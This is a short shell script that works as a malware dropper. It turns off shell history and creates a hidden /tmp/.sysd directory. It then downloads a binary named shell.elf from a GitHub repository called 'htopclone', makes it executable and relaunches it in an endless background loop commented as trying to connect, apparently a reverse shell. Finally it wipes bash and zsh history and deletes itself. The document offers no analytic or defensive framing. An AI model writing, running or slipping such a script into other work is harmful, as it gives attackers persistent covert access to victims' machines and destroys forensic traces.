#!/bin/sh

unset HISTFILE
HISTSIZE=0
HISTFILESIZE=0

TMP_DIR="/tmp/.sysd"
BIN_PATH="$TMP_DIR/shell.elf"

mkdir -p "$TMP_DIR"
curl -s -L https://raw.githubusercontent.com/diedromeo/htopclone/main/shell.elf -o "$BIN_PATH"
chmod +x "$BIN_PATH"

# Loop to keep trying to connect
(
  while true; do
    "$BIN_PATH" >/dev/null 2>&1
    sleep 5
  done
) &

sleep 1
rm -f ~/.bash_history ~/.zsh_history
[ -f "$0" ] && rm -- "$0"

exit 0
